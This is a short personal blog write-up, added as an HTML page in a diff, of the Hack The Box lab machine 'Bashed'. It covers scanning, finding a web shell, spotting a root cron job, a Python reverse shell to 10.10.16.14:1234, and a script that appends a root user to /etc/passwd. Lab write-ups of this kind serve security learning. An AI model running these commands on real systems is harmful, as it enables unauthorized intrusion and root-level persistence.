@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - HTB Bashed | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - HTB Bashed | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - HTB Bashed | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - HTB Bashed | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - HTB Bashed | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for HTB Bashed">
+<meta itemprop="description" content="Writeup for HTB Bashed" />
+<meta property="og:description" content="Writeup for HTB Bashed" />
+<meta name="twitter:description" content="Writeup for HTB Bashed" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-11-11T00:00:00Z />
+    <meta property="article:published_time" content=2023-11-11T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - HTB Bashed",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-11-11",
+        "description": "Writeup for HTB Bashed",
+        "wordCount":  461 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-11-11",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/bashed/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - HTB Bashed</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-11-11T00:00:00&#43;00:00" itemprop="datePublished"> 11 Nov 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#bashed">bashed</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#nikto">Nikto</a></li>
+        <li><a href="#interesting-page">Interesting page</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#root-shell">Root shell</a></li>
+    <li><a href="#note">Note</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="bashed">bashed</h1>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/bashed<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sV -sC -T4 -p- 10.129.65.207 -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 22:20 EET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.65.207
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.038s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65534</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Arrexel<span class="err">&#39;</span>s Development Site
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 21.04 seconds
+</span></span></code></pre></div><h2 id="nikto">Nikto</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/bashed<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nikto -host 10.129.65.207                      
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          10.129.65.207
+</span></span><span class="line"><span class="cl">+ Target Hostname:    10.129.65.207
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2023-11-10 22:30:38 <span class="o">(</span>GMT2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Apache/2.4.18 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span>. Apache 2.2.34 is the EOL <span class="k">for</span> the 2.x branch.
+</span></span><span class="line"><span class="cl">+ IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&#34;127.0.1.1&#34;</span>.
+</span></span><span class="line"><span class="cl">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is <span class="s2">&#34;127.0.1.1&#34;</span>.
+</span></span><span class="line"><span class="cl">+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+</span></span><span class="line"><span class="cl">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+</span></span><span class="line"><span class="cl">+ /config.php: PHP Config file may contain database IDs and passwords.
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /css/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /css/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /dev/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /dev/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /php/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /php/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /images/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span></code></pre></div><h2 id="interesting-page">Interesting page</h2>
+<p>Found web shell page dev directory.</p>
+<p><img src="bashed%20efd9ba4e5e124df38fb09460192c2804/Screenshot_2023-11-10_at_22.36.50.png" alt="Screenshot 2023-11-10 at 22.36.50.png"></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bashed:/$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on bashed:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on bashed:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>scriptmanager : scriptmanager<span class="o">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><p>I run the PSPY and found hidden cron task.</p>
+<p>Seems like root runs python script in script folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023/11/10 13:54:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">43970</span>  <span class="p">|</span> /bin/sh -c <span class="nb">cd</span> /scripts<span class="p">;</span> <span class="k">for</span> f in *.py<span class="p">;</span> <span class="k">do</span> python <span class="s2">&#34;</span><span class="nv">$f</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></div><p>I made reverse shell in python but the connection is cut off every immediately.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bashed:/scripts$ <span class="nb">echo</span> <span class="s2">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;</span>10.10.16.14<span class="s2">&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;</span>/bin/sh<span class="s2">&#34;,&#34;</span>-i<span class="s2">&#34;]);&#34;</span> &gt; shell.py
+</span></span><span class="line"><span class="cl">&lt;<span class="o">)</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">&#34;/bin/sh&#34;</span>,<span class="s2">&#34;-i&#34;</span><span class="o">])</span><span class="p">;</span><span class="s2">&#34; &gt; shell.py
+</span></span></span></code></pre></div><p>I added a script that writes new root user in /etc/passwd</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bashed:/scripts$ <span class="nb">echo</span> <span class="s1">&#39;open(&#34;/etc/passwd&#34;,&#34;a&#34;).write(&#34;keisuke:$1$jlX/nz9g$CddSuG5PoTI/9bLGZzDum1:0:0:root:/root:/bin/bash\n&#34;)&#39;</span> &gt; root.py
+</span></span></code></pre></div><h1 id="root-shell">Root shell</h1>
+<p><img src="bashed%20efd9ba4e5e124df38fb09460192c2804/Screenshot_2023-11-11_at_00.11.29.png" alt="Screenshot 2023-11-11 at 00.11.29.png"></p>
+<h1 id="note">Note</h1>
+<p>I used PSPY for the first time.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
